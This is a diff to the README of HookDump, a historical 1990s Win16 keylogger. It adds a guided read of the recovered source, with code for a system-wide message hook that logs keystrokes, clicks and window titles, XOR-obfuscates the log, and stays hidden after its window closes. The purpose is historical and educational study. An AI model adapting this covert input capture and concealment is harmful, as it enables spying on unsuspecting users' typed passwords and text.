@@ -9,16 +9,18 @@ cited in security and anti-virus literature. It has its own articles in the
 [Russian](https://ru.wikipedia.org/wiki/HookDump) and
 [Ukrainian](https://uk.wikipedia.org/wiki/HookDump) Wikipedias.
 
-This repository preserves the program as a **historical software artifact**.
+This repository preserves the program as a **historical software artifact**, and the
+author releases all of it — the original source included — under the **MIT License** so
+anyone may study it.
 
-> **About the sources.** HookDump's *own* original source — written in **Turbo Pascal for
-> Windows (16-bit)** — has **not survived**; a search of the author's archives turned up
-> only the compiled binaries (`HOOKDUMP.EXE`, `HOOKDMP.DLL`, an earlier `HOOK.EXE` from
-> 1995, the related `KBD6.EXE`, and compiled `.TPU` units). What is in [`src/`](src) is a
-> **later, separate Delphi / Object Pascal project by the same author** that reuses the
-> same Windows keyboard-hook technique — a successor, not the original HookDump. The
-> author releases that source under the **MIT License** so anyone may study the technique.
-> The surviving original binaries are preserved locally in `_backup/` (not in git).
+> **About the sources.** The **original HookDump source was recovered** (2026) from the
+> author's own encrypted archives. It was written in **Borland Pascal for Windows (16-bit)**.
+> It is now in [`src/original-16bit/`](src/original-16bit): the application
+> (`HOOKDUMP.PAS`) and the hook **DLL** (`HOOKDMP.PAS`), which captures input through a
+> **`WH_GETMESSAGE`** hook. A later **32-bit Delphi port** is in
+> [`src/port-32bit-delphi/`](src/port-32bit-delphi), and a small separate Delphi hook demo
+> in [`src/successor-hookproj/`](src/successor-hookproj). The full version history (v1.5 …
+> v2.8) is published under [`versions/`](versions).
 
 **The program does not run on modern systems — and, as the author recalls, it worked
 only on 16-bit Windows, not 32-bit.** Its whole trick depended on the **Win16
@@ -39,9 +41,10 @@ via Wikimedia Commons.*
 - Home page: http://ctrl8.com/HookDump
 - Source (MIT): https://github.com/ilya000/HookDump
 - Author: iLya — Ilya V. Osipov · https://github.com/ilya000
-- Original home: `http://www.halyava.ru/ilya000` (the author's earliest page, on the free
-  "Халява" hosting of the late 1990s); later `www.ilya.nn.ru`, now archived under
-  `old.osipov.ru`. No surviving Wayback snapshot of the `halyava.ru` page was found.
+- Original product page: published at **`http://www.halyava.ru/ilya/hookd.htm`** (the
+  author's late-1990s page on the free "Халява" hosting; the URL is hard-coded in the
+  program itself), later `www.ilya.nn.ru` — now available again at
+  **`http://old.osipov.ru/ilya/hookd.htm`**.
 - Press, reviews and references: [PRESS.md](PRESS.md)
 
 ## Author's intent and origin
@@ -75,8 +78,8 @@ input monitoring, and it became a reference example of how far a small Pascal pr
 could go. What made it notable at the time:
 
 **Core features**
-- Global keyboard hook via `SetWindowsHookEx(WH_KEYBOARD, …)` installed from a DLL, so
-  every running application's keystrokes flowed through it.
+- A system-wide **`WH_GETMESSAGE`** hook installed from a DLL, so the messages of every
+  running application — key presses, characters, mouse clicks — flowed through it.
 - Logged **everything typed and clicked**, system-wide, to a file.
 - Recorded **context** for each event: which program, which window title, which field —
   with timestamps.
@@ -95,12 +98,11 @@ could go. What made it notable at the time:
   those stored in masked Dial-Up Networking fields, by reading the field context rather
   than just the visible characters.
 - **Global, system-wide visibility from one hook** — under the Win16 model all
-  applications shared a single address space, and a DLL's data segment was shared across
-  every process using it, so one keyboard-hook DLL naturally saw and logged activity in
-  *all* running programs. (This is exactly the property the 32-bit model later removed —
-  see above. The recovered 32-bit demo has to recreate that shared state by hand with a
-  named file-mapping, `CreateFileMapping`/`MapViewOfFile`; the original 16-bit build got
-  it for free.)
+  applications shared a single address space, and a DLL's data segment (its log file
+  handle, buffer and options) was shared across every process using it, so one
+  `WH_GETMESSAGE` hook DLL naturally saw and logged activity in *all* running programs.
+  (This is exactly the property the 32-bit model later removed — see above; the 32-bit
+  port has to recreate that shared state by hand.)
 - **A managed uninstall path**: because it ran hidden, removal required relaunching it in
   visible mode with the `/V` switch and exiting — a deliberate design rather than an
   afterthought.
@@ -119,89 +121,210 @@ See [PRESS.md](PRESS.md) for the contemporary reviews (Computerra called version
 ## How it works
 
 **Today this is of historical interest only** — a study artifact of late-1990s Windows
-hooking. The technique relied on the **16-bit Windows multitasking model** (one shared
-address space for all applications) and stopped working once Windows moved to 32-bit
-isolated per-process address spaces (see the note above).
+hooking. This is a guided read of the **original source** in
+[`src/original-16bit/`](src/original-16bit) (Borland Pascal for Windows, 16-bit). The
+program is two halves:
 
-The code shown here is from the **later Delphi successor** in `src/` (see *About the
-sources* above) — it illustrates the same keyboard-hook technique the original used. It is
-two parts: a **hook DLL** (`src/HOOKDLL.DPR`) and a small **controlling application**
-(`src/MAIN.PAS`); all the interesting work is in the DLL. The file-logging and the hiding
-trick described below belonged to the original 16-bit `HOOKDUMP.EXE`, whose own Turbo
-Pascal source did not survive — so they are reconstructed here from how the program
-behaved, not from its code.
+- **the application** `HookDump` ([`HOOKDUMP.PAS`](src/original-16bit/HOOKDUMP.PAS)) — the
+  visible window, menu, options and install/uninstall logic;
+- **the hook DLL** `HookDmp` ([`HOOKDMP.PAS`](src/original-16bit/HOOKDMP.PAS)) — the part
+  that actually captures input and writes the log.
 
-**1. Shared state across every process.** A global `WH_KEYBOARD` hook puts the DLL into
-*every* process. Under Win16 the DLL's data was shared automatically; in the recovered
-**32-bit** demo each process gets its own copy, so the shared state (the app's window
-handle and the hook handle) is recreated by hand in one **named file-mapping** visible to
-all copies:
+It has to be a DLL because the capture runs *inside other programs*: under 16-bit Windows
+a single DLL instance, with one shared data segment, is mapped into every task — so the
+DLL is the natural place to keep the log file, the buffer and the options that all those
+tasks share.
 
-```pascal
-// A fixed, unique name, so every process maps the SAME shared block:
-Const GlobMapID = 'Global Keyboard Hook Demo {917C91AA-...}';
-// The shared record: the app window to notify, the installed hook, a spare handle:
-Type  TShareInf = Record AppWndHandle: HWND; OldHookHandle: HHOOK; hm: THandle; End;
+### 1. The hook procedure — one filter for the whole system
 
-Procedure DLLEntryPoint(dwReason: DWORD); stdcall;  // runs in every process that loads the DLL
-Begin                                               // (here: on DLL_PROCESS_ATTACH)
-  // Create/open a named shared-memory block backed by the page file (no disk file):
-  MapHandle := CreateFileMapping(INVALID_HANDLE_VALUE, nil, PAGE_READWRITE, 0, SizeOf(TShareInf), GlobMapID);
-  // Map it into THIS process and get a pointer to the one shared record:
-  ShareInf  := MapViewOfFile(MapHandle, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(TShareInf));
-End;
-```
-
-**2. Install the hook and deliver keystrokes.** The app calls `SetKeyboardHook(Handle)`;
-the DLL remembers the window and arms the system hook. Each keystroke is forwarded to that
-window via `WM_USER`, then the hook chain continues with `CallNextHookEx`:
+The capture is a **`WH_GETMESSAGE`** hook. Windows calls `MsgHookProc` for *every* message
+it dispatches in *any* application; the `lParam` points at that `TMsg`. The procedure
+looks at the message, logs what it cares about, and must always pass control on with
+`DefHookProc`:
 
 ```pascal
-Function SetKeyboardHook(Wnd: HWND): BOOL; stdcall;
-Begin
-  ShareInf^.AppWndHandle  := Wnd;                  // remember which window should receive the keys
-  // Arm a GLOBAL keyboard hook (thread id 0 = all threads); save its handle in shared memory:
-  ShareInf^.OldHookHandle := SetWindowsHookEx(WH_KEYBOARD, @KeyboardHook, HInstance, 0);
-  ...
+function MsgHookProc(code: Integer; WParamq: Word; LParamq: Longint): Longint; export;
+  var P : PMsg absolute LParamq;          // reinterpret lParam as a pointer to the message
+  Begin
+    Case P^.Message of
 
-// Called by Windows for every keystroke, inside whichever process has focus:
-Function KeyboardHook(Code: Integer; ParamW: WPARAM; ParamL: LPARAM): LRESULT; stdcall;
-Begin
-  If Code IN [HC_ACTION, HC_NOREMOVE] Then         // only when the params carry a real keystroke
-    SendMessage(ShareInf^.AppWndHandle, WM_USER, ParamW, Code);   // forward the key code to the app window
-  Result := CallNextHookEx(ShareInf^.OldHookHandle, Code, ParamW, ParamL);  // let the next hook in the chain run
-End;
+      WM_KEYDOWN, WM_SysKEYDOWN:
+      if Accept(p^.WParam, WM_KEYDOWN) Then   // de-dup auto-repeat (see step 2)
+      Begin
+        WriteModule;                          // note which program/window this went to
+        case p^.WParam of                     // modifier keys only update state, aren't logged
+          vk_Menu:    KeyState := KeyState or k_Menu;
+          vk_Shift:   KeyState := KeyState or k_Shift;
+          vk_Control: KeyState := KeyState or k_Control;
+          else if st.WritePush Then           // optional: log the key-DOWN event itself
+            WriteStr('{'#$19 + GetLongKeyName(P^) + '}');   // e.g. {Ctrl+F4}
+        end;
+      end;
+
+      WM_KEYUp, WM_SysKEYUp:
+      if Accept(p^.WParam, WM_KEYUp) Then
+      Begin
+        WriteModule;
+        case p^.WParam of                     // releasing a modifier clears its bit
+          vk_Menu:    KeyState := KeyState and not k_Menu;
+          vk_Shift:   KeyState := KeyState and not k_Shift;
+          vk_Control: KeyState := KeyState and not k_Control;
+          else if st.WritePop Then
+            WriteStr('{'#$18 + GetLongKeyName(P^) + '}');
+        end;
+      end;
+
+      wm_Char, wm_SysChar:                     // the cooked character (after layout/Shift)
+      if Accept(p^.WParam, WM_Char) Then
+      Begin
+        WriteModule;
+        if st.WriteBasic Then WriteStr(char(P^.WParam));   // <-- the plain text you typed
+      end;
+
+      WM_LBUTTONUP, WM_MBUTTONUP, WM_RBUTTONUP:
+      if st.UseMouse Then begin WriteModule;
+        if st.WritePop Then WriteStr('{'#$18 + GetLongMouseKeyName(P^) + '}'); end;
+      WM_LBUTTONDown, WM_MBUTTONDown, WM_RBUTTONDown:
+      if st.UseMouse Then begin WriteModule;
+        if st.WritePush Then WriteStr('{'#$19 + GetLongMouseKeyName(P^) + '}'); end;
+
+    End{case};
+    DefHookProc(Code, wParamq, lParamq, lpfnNextHook);   // ALWAYS chain to the next hook
+  End;
+
+Exports
+  MsgHookProc index 1 resident, ... ;        // exported by ordinal; 'resident' = lock in memory
 ```
 
-**3. Application side** (`MAIN.PAS`) — import from the DLL and receive the codes:
+Note the design choice: it logs **`wm_Char`** for normal text (already translated through
+the active keyboard layout, so it records the real characters, Cyrillic included), and
+uses **`WM_KEYDOWN/UP`** only to track modifiers and optional "raw key" logging. That is
+why it captured *what was actually typed*, not just scan codes.
+
+### 2. Not logging the same key twice
+
+Key-repeat floods `WM_KEYDOWN`. A tiny one-slot filter collapses repeats — it accepts an
+event only when the (key, message) pair differs from the previous one:
 
 ```pascal
-// Bind directly to the function exported by the DLL:
-Function SetKeyboardHook(Wnd: HWND): BOOL; stdcall; external 'HookDLL.dll' name 'SetKeyboardHook';
-
-Procedure TMainForm.WMUser(var Message: TMessage);  // handler declared as: message WM_USER
-Begin
-  // WParam holds the key code; show it as a number and as its character:
-  Memo1.Lines.Add('Code: '+IntToStr(Message.WParam)+';  Char: '+Chr(Message.wParam));
-End;
+const LastKey: Word = 0;  LastWM: Word = 0;
+function Accept(Key, WM: Word): Boolean;
+begin
+  if (LastKey <> Key) or (LastWM <> WM) Then begin
+    LastKey := Key;  LastWM := WM;  Accept := True;     // new event -> log it
+  end
+  else Accept := False;                                 // same as last -> skip (auto-repeat)
+end;
 ```
 
-### The key trick — making the program "disappear"
+### 3. Context — which program and window the input went to
 
-Once the hook is set, the DLL is already resident inside other processes and (in the full
-build) writing the log — so the visible application is no longer needed. HookDump's trick:
+Before logging a burst of input, `WriteModule` records *where* it was typed, but only when
+the active task or focused window changes (so the log reads like `[program | window]`):
 
-- The program **exits, leaving the hook DLL resident.** No window, no process in the task
-  list — only the invisible DLL living inside other processes. This is the "invisible in
-  Task Manager" behaviour the press noted.
-- To stop Windows from unloading the DLL automatically when the application exits, the
-  **DLL was loaded twice**, so its reference count is **2**. Windows of that era, on
-  cleanup, decrements the count by only one — so the DLL (and the active hook) stays alive.
-- Removal therefore required deliberately relaunching in **visible mode (`/V`)** and
-  unloading cleanly.
+```pascal
+Procedure WriteModule;
+Var Wnd, ActW: HWnd;  Task: THandle;
+begin
+  if (st.ExeName = false) and (st.WndName = false) Then exit;
+  Task := GetCurrentTask;  Wnd := GetFocus;
+  if (LastTask <> Task) or (LastWnd <> Wnd) Then begin    // only on a change
+    LastTask := Task;  LastWnd := Wnd;
+    WriteStr(#13#10'[');
+    if st.ExeName Then begin                              // the running .EXE name
+      byte(SBuf[0]) := GetModuleFileName(Task, @SBuf[1], sizeof(SBuf));
+      ...
+      WriteStr(strpas(Prog));
+    end;
+    if st.WndName Then begin                              // the window/title text
+      GetWindowText(Wnd, @SBuf[1], sizeof(SBuf));
+      WriteStr(strpas(@SBuf[1]));
+    end;
+    WriteStr(']'#13#10);
+  end;
+end;
+```
 
-In short: the system hook has already spread the DLL across processes, and an artificially
-raised reference count keeps the OS from unloading it once the original EXE is gone.
+This is the feature the press highlighted — and the same one a textbook later cited as a
+way to gather *interface-usage statistics*: you can see which program/field received input.
+
+### 4. The log writer — buffering, XOR, ANSI→OEM
+
+Everything funnels through `WriteStr`. The normal state of the log file is **closed**; it
+is opened only to append, so the file is robust if the machine is reset:
+
+```pascal
+Function WriteStr(N: String): Boolean;
+begin
+  if st.AnsiToOem Then N := Rus_Windows2Dos(N);        // CP1251 (Windows) -> CP866 (DOS) text
+  if st.XorOutput Then N := XorString(N, st.XorBase);  // optional obfuscation with a 1-byte key
+  if st.UseBuffer Then AddStr(N)                       // collect in a PChar buffer...
+  else begin Append(F); System.Write(F, N); Close(F); end;  // ...or write now and re-close
+end;
+
+Procedure AddStr(N: String);                           // buffer; flush when it would overflow
+begin
+  if BUF = nil Then Exit;
+  if StrLen(BUF) + Length(N) >= st.BufSize Then FlashStr;
+  StrCopy(StrEnd(BUF), @(N + #0)[1]);
+end;
+
+Procedure FlashStr;                                    // append the buffer to the file, then clear
+begin Append(F); System.Write(F, BUF); Close(F); BUF[0] := #0; end;
+```
+
+### 5. The application arms the hook
+
+`HOOKDUMP.PAS` loads the DLL, looks up the exported `MsgHookProc`, and installs it as a
+**system-wide** message hook (and sanity-checks that EXE and DLL versions match):
+
+```pascal
+hHookDLL := LoadLibrary('HookDmp.dll');
+Hook     := GetProcAddress(hHookDLL, 'MsgHookProc');
+SETlpfnNextHook( SetWindowsHook(WH_GETMESSAGE, Hook) );  // install; keep the previous hook to chain to
+```
+
+### 6. The key trick — making the program "disappear"
+
+The whole point is that the **DLL keeps running after the visible program is gone**. The
+window's "Exit" actually asks what to do:
+
+```pascal
+case MessageBox(GetFocus, 'Close the Dump ?'#13#13
+      + 'Yes - Exit and close hook; No - Hide', 'Exit',
+      MB_ICONQUESTION or MB_YESNOCANCEL) of
+  IDNO:  begin DoneWindow(Window); DestroyWindow(Window); end;          // HIDE: leave the DLL loaded
+  IDYES: begin DoneWindow(Window); UnloadLibrary; DestroyWindow(Window); end; // really remove it
+end;
+```
+
+- On **Hide** the app destroys only its window and exits — it does **not** unload
+  `HookDmp.dll`. The DLL stays resident, still mapped into every task by the system hook,
+  quietly logging. No window, no entry in the task list — the "invisible in Task Manager"
+  behaviour the press noted.
+- A 16-bit DLL is shared by a **use count**, and the trick to keep it alive was to make
+  sure that count never falls to zero when the launcher leaves — in effect **the DLL is
+  loaded more times than it is freed**, so Windows never unloads it. `UnloadLibrary` is the
+  deliberate cleanup: it finds the module and calls `FreeLibrary` once per remaining use
+  (`for i := 1 to Q.wUsageFlags-1 do FreeLibrary(H)`), which is why removal needs the
+  explicit **visible mode (`/V`)** path.
+- When the DLL is finally unloaded, its `ExitProc` handler closes the record cleanly:
+
+```pascal
+var oldExitProc: Pointer;
+Procedure dllExitProc;
+begin
+  ExitProc := oldExitProc;
+  if inited Then WriteStr(#13#10'[End of file. ' + Time + ']'#13#10);
+  FlashStr;                                   // flush whatever is still buffered
+end;
+Begin
+  oldExitProc := ExitProc;  ExitProc := @dllExitProc;   // chain ourselves onto unit shutdown
+End.
+```
+
+> Note: in this 1998-02 source snapshot the `SetWindowsHook(WH_GETMESSAGE, …)` call in the
+> app is commented out (a mid-development state); the shipped builds installed it as shown.
 
 ---
 
@@ -216,8 +339,7 @@ The distributed archive `hookdump.zip` (dated 1998-01-09) contained four files:
 | `HOOKDUMP.HLP` | Windows help file |
 | `HOOKDUMP.INI` | configuration |
 
-The release archive and the historical binaries are preserved locally under
-[`_backup/`](#repository-layout) (not tracked in git — see below).
+This 2.8 release — and every earlier one — is published under [`versions/`](versions).
 
 ### Configuration — `HOOKDUMP.INI`
 
@@ -247,49 +369,38 @@ UseBuffer=01        ; buffer writes
 
 ```
 HookDump/
-├─ src/                 Delphi SUCCESSOR project (MIT) — NOT the original; same technique
-│  ├─ HOOKDLL.DPR       the keyboard-hook DLL (SetWindowsHookEx, file-mapping shared state)
-│  ├─ HOOKPROJ.DPR      the controlling application project (Delphi 32-bit)
-│  ├─ MAIN.PAS          the test form: prints key codes, Set/Remove hook buttons
-│  ├─ MAIN.DFM          the test form layout
-│  └─ HOOKPROJ.RES      compiled resource for the project
-├─ web/
-│  └─ index.html        project home page (ctrl8.com/HookDump)
+├─ src/
+│  ├─ original-16bit/      THE ORIGINAL — Borland Pascal for Windows
+│  │   ├─ HOOKDUMP.PAS     the application (window, menu, /V, INI, install)
+│  │   ├─ HOOKDMP.PAS      the WH_GETMESSAGE hook DLL (capture + logging)
+│  │   ├─ TYPES.PAS        shared options/types
+│  │   └─ SWITCH.PAS       single-instance helper
+│  ├─ port-32bit-delphi/   a later 32-bit Delphi port (HOOK32 + HOOKMAIN/ABOUT/OPTION/GLOBAL)
+│  └─ successor-hookproj/  a small separate Delphi hook demo (not the original)
+├─ versions/               version history v1.5 … v2.8 (period release binaries) + early source
+├─ web/index.html          project home page (ctrl8.com/HookDump)
 ├─ README.md  PRESS.md  CHANGELOG.md  NOTICE.md  LICENSE
-└─ _backup/             local-only archive — NOT tracked by git
-   ├─ release-2.8/hookdump.zip                 the distributed 2.8 archive
-   └─ original/
-      ├─ MY_PROG_HOOK/  HOOKDMP.DLL, HOOKDUMP.HLP/.GID/.INI
-      ├─ hookproj/      full original project incl. HOOKPROJ.exe, HOOKDLL.dll, .dcu
-      ├─ hookd.htm      original Russian product page (CP1251)
-      └─ hookde.htm     original English product page
+└─ _backup/                local-only working store — NOT tracked by git
+   └─ original-source/      full recovered tree (compiled io units, help sources, backups, ARHIV)
 ```
 
-`src/` holds the **demo/test project** that exercises the hook DLL: `MAIN.PAS` calls
-`SetKeyboardHook` / `RemoveKeyboardHook` exported from `HOOKDLL.dll` and prints incoming
-key codes to a memo. The shipped `HOOKDUMP.EXE` is the file-logging build of the same
-technique.
-
-**What is and isn't in git.** The Object Pascal **sources** (`src/`) are published under
-MIT for study. The compiled **Windows binaries and the release archive** are kept only in
-`_backup/` (git-ignored): they are 1990s keylogger executables, of historical interest
-but not something to ship in a public repository.
+Everything that is source — the original, the Delphi port, the demo — is in `src/` under
+the MIT License. The historical version releases are under `versions/`. `_backup/` keeps
+the complete recovered working tree (compiled `.TPW`/`.DCU` units, `.HLP`/`.RTF` help
+sources, editor backups) that isn't needed in the published repo.
 
 ---
 
 ## Building
 
-These are mid-1990s Delphi-era Object Pascal sources. They are kept for historical and
-educational study; there is no modern build wired up. To compile them you would need a
-period Delphi, or a port to **Free Pascal / Lazarus** targeting Win32. The Windows hook
-APIs used (`SetWindowsHookEx`, `CallNextHookEx`, `UnhookWindowsHookEx`, file mapping for
-cross-process state) still exist on modern Windows, but the program is **not** intended
-to be rebuilt or run as live software.
-
-> Note on language: the original HookDump was written in **Turbo Pascal for Windows
-> (16-bit)** — as the Russian Wikipedia article also states (Win16, 21,760-byte EXE) — and
-> that source did not survive. The source in `src/` is the author's **later Delphi /
-> Object Pascal successor** (the 32-bit `HOOKPROJ.exe`), a different toolchain and build.
+The original (`src/original-16bit/`) is **Borland Pascal 7 for Windows (16-bit)** — raw
+WinAPI (`WinTypes`/`WinProcs`), the `WH_GETMESSAGE` hook via `SetWindowsHook` /
+`DefHookProc`, `MakeProcInstance`, and the author's own `ioGDI` / `ioString` units
+(compiled `.TPW` preserved under `_backup/`; their own source was not in the archive). The
+`src/port-32bit-delphi/` files are a later Delphi (VCL) port. These are kept for historical
+and educational study; there is **no** modern build wired up and the program is not meant
+to be rebuilt or run as live software — it does not work on modern Windows anyway (see
+above).
 
 ---
 
@@ -297,14 +408,13 @@ to be rebuilt or run as live software.
 
 - **HookRus** — earlier Russian keyboard-layout patcher; HookDump grew out of its hook code.
 - **1996** — first release (per Russian Wikipedia).
-- **2.5** — glitch when logging into Windows under a different name.
-- **2.6** — no warning window on repeated hidden launch; uninstall via `/V` (visible mode);
-  the 2.5 login-name glitch fixed.
-- **2.7** — version documented on the English product page.
-- **2.8** — version on the Russian product page; release archive dated 1998-01-09;
-  reviewed as best in class by *Computerra* (1999).
+- **1.5 / early-1.x** — Feb 1997 (the 1997-02 snapshot in `versions/` also carries source).
+- **2.0b** — Feb 1997; **2.5b** — Apr 1997 (glitch under a different Windows login, later fixed).
+- **2.6b** — Oct 1997: no warning window on repeated hidden launch; uninstall via `/V`.
+- **2.7** — Oct 1997 (English product page).
+- **2.8** — release archive dated 1998-01-09; named best in class by *Computerra* (1999).
 
-Created 1997-10-23 (per the product page), Nizhny Novgorod. See [CHANGELOG.md](CHANGELOG.md).
+All of the above are published under [`versions/`](versions). See [CHANGELOG.md](CHANGELOG.md).
 
 ---
 
